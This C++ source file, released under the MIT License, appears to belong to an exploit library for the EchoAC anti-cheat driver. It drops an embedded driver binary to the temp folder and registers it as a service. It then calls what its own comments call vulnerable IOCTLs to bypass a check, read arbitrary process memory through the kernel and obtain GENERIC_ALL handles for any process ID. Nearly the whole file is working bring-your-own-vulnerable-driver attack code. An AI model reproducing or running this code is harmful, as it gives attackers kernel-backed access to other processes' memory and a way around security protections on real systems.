// MIT License
//
// Copyright (c) 2023 t4bby
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

#include "echoac.h"

#define UDBG(format, ...) printf(format, __VA_ARGS__)

//
// Initialize the driver and service
//
bool echoac::init() {
    char temp_path[MAX_PATH];
    const uint32_t length = GetTempPath(sizeof(temp_path), temp_path);

    if (length > MAX_PATH || !length)
    {
        return false;
    }

    //
    // place the driver binary into the temp path
    //
    const std::string placement_path = std::string(temp_path) + ECHOAC_SYSFILE_NAME;

    if (std::filesystem::exists(placement_path))
    {
        std::remove(placement_path.c_str());
    }

    //
    // create driver sys from memory
    //
    if (!file_utils::create_file_from_buffer(
            placement_path,
            (void*)resource::raw_driver,
            sizeof(resource::raw_driver)
    ))
    {
        return false;
    }


    //
    // create service using WinAPI, this needs administrator privilege
    //
    detail::echoac_service_handle = service_utils::create_service(placement_path);

    if (!CHECK_HANDLE(detail::echoac_service_handle))
    {
        return false;
    }

    //
    // start the service
    //
    if (!service_utils::start_service(detail::echoac_service_handle))
    {
        return false;
    }

    //
    // open the handle of its driver device
    //
    detail::device_handle = CreateFileA(
            ECHOAC_DEVICE_NAME,
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            NULL,
            NULL
    );

    if (!CHECK_HANDLE(detail::device_handle))
    {
        return false;
    }

    return true;
}

//
// unload the EchoAC driver and delete the service
//
void echoac::unload()
{
    if (detail::device_handle)
    {
        CloseHandle(detail::device_handle);
    }

    if (detail::echoac_service_handle)
    {
        service_utils::stop_service(detail::echoac_service_handle);
        service_utils::delete_service(detail::echoac_service_handle);
    }
}

//
// initialize driver implementations
//
bool echoac::driver_impl::driver_init() {

    //
    // original poc implementation
    //

    // Yes, this buffer seems useless - but without it the driver BSOD's the PC.
    // Create a buffer to have data returned to.
    void* buf = (void*)malloc(ECHOAC_IOCTL_BUFFER_SIZE);

    //
    // Call IOCTL Code (0x9e6a0594) that sets the PID variable and gets past the DWORD check
    //
    if (!DeviceIoControl(echoac::detail::device_handle,
        ECHOAC_IOCTL_INITIALIZE, NULL, NULL, buf, ECHOAC_IOCTL_BUFFER_SIZE, NULL, NULL)) {
        return false;
    }

    //
    // Free the buffer
    //
    free(buf);

    //
    // driver's base address in the system
    //
    uint64_t echoac_address = win_utils::find_sysmodule_address(ECHOAC_SYSFILE_NAME);
    if (!echoac_address)
    {
        return false;
    }

    return true;
}

//
// read memory from the kernel using vulnerable ioctl
//
bool echoac::driver_impl::read_process_memory(HANDLE target_process,
                                              const uint64_t& address,
                                              void* buffer, const size_t& size) {

    k_param_readmem req{};
    req.fromAddress = (void*)address;
    req.length = size;
    req.targetProcess = target_process;
    req.toAddress = (void*)buffer;

    BOOL status = DeviceIoControl(echoac::detail::device_handle, ECHOAC_IOCTL_READ_PROCESS_MEMORY,
        &req, sizeof(k_param_readmem), &req, sizeof(k_param_readmem), NULL, NULL);

    return status;
}

//
// Get HANDLE for PID using vulnerable ioctl
//
HANDLE echoac::driver_impl::get_handle_for_pid(DWORD pid) {
    //
    // Structure to send to the driver
    //
    k_get_handle param{};

    //
    // Process ID to get handle for
    //
    param.pid = pid;

    //
    // Access to be granted on the returned handle
    //
    param.access = GENERIC_ALL;

    //
    // Send the IOCTL to the driver
    //
    BOOL status = DeviceIoControl(echoac::detail::device_handle, ECHOAC_IOCTL_PID_HANDLE,
        &param, sizeof(param), &param, sizeof(param), NULL, NULL);
    if (!status) {
        return INVALID_HANDLE_VALUE;
    }

    //
    // Return the handle given by the driver.
    //
    return param.handle;
}